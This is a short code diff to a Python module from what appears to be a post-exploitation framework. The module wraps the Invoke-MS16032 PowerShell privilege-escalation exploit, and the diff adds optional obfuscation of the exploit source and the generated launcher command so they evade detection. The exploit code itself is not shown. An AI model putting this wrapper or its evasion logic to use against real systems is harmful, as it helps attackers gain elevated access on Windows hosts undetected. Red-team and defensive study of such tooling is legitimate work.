@@ -69,9 +69,12 @@ class Module:
                     self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-MS16032.ps1"
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -95,7 +98,9 @@ class Module:
         # need to escape characters
         launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"","'")
         
-        script += 'Invoke-MS16032 -Command "' + launcherCode + '"'
-        script += ';`nInvoke-MS16032 completed.'
-
+        scriptEnd = 'Invoke-MS16032 -Command "' + launcherCode + '"'
+        scriptEnd += ';`nInvoke-MS16032 completed.'
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
